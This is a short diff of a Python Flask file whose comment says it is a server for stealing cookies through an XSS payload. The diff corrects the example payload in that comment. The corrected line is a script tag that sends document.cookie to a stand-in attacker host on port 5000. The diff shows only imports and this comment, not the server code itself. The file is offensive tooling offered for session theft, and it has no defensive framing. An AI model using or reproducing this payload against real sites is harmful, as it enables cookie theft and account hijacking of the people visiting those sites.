@@ -2,7 +2,7 @@ from flask import Flask, request, redirect
 from datetime import datetime
 
 # Python server to steal cookies when included in an XSS payload. I.e.:
-#   vulnParameter=<script src=http://attacker_IP:5000/?c="document.cookie;></script>
+#   vulnParameter=<script src=http://attacker_IP:5000/?c="+document.cookie;></script>
 
 app = Flask(__name__) # create instance of the app
 
